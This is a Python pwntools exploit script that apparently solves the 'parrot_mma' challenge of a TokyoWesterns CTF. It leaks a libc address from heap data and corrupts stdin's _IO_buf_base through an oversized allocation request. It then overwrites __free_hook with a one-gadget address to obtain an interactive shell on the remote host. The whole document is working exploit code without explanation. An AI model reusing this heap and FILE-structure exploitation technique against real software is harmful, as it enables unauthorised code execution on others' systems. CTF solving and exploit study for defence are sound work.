from pwn import *
import sys, time

context.binary = "./parrot_mma"
binary = ELF("./parrot_mma")

host = "pwn2.chal.ctf.westerns.tokyo"
port = 31337

prog = log.progress("Exploit stage ")

if len(sys.argv) == 1:
    p = process(["./parrot_mma"])
    pause()
    prog.status("PID : " + str(proc.pidof(p)[0]))

else:
    p = remote(host, port)

def req_data(size, data, _send = False):
    p.recvuntil("Size:\n")
    p.sendline(str(size))
    p.recvuntil("Buffer:\n")
    if _send:
        p.send(data)
    else:
        p.sendline(data)

req_data(0x20, "A" * 8)
req_data(0x30, "B" * 8)
req_data(0x400, "C" * 7)

p.recvuntil("C" * 7)
p.recv(1)
libc_base = u64(p.recv(8)) - 0x3c4b78
_IO_buf_base = libc_base + 0x3c4918
free_hook = libc_base + 0x3c67a8
magic = libc_base + 0x4526a
log.info("libc_base : " + hex(libc_base))

req_data(_IO_buf_base + 1, "")
p.sendline("1".ljust(0x18, "\x00") + p64(free_hook) + p64(free_hook + 0x40) + p64(0) * 6)

for i in xrange(0x59):
    p.sendline("")

p.sendline(p64(magic))

p.interactive()
